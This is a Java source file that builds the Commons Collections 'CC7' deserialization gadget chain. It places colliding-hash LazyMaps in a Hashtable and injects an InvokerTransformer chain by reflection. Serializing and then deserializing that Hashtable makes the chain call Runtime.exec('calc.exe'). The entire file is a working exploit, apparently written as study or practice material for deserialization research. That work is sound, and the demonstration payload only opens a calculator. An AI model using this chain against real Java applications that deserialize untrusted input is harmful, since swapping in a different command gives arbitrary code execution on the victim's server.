package com.example.cc7;

import com.example.Utils;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class cc7Ver4 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();

        Map decorateMap1 = LazyMap.lazyMap(hashMap1, chainedTransformer);
        decorateMap1.put("yy", 1);
        Map decorateMap2 = LazyMap.lazyMap(hashMap2, chainedTransformer);
        decorateMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(decorateMap1, 1);
        hashtable.put(decorateMap2, 1);
        Utils.SetValue(chainedTransformer,"iTransformers",transformers);
        decorateMap2.remove("yy");


        String barr = Utils.Serialize(hashtable);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }
}
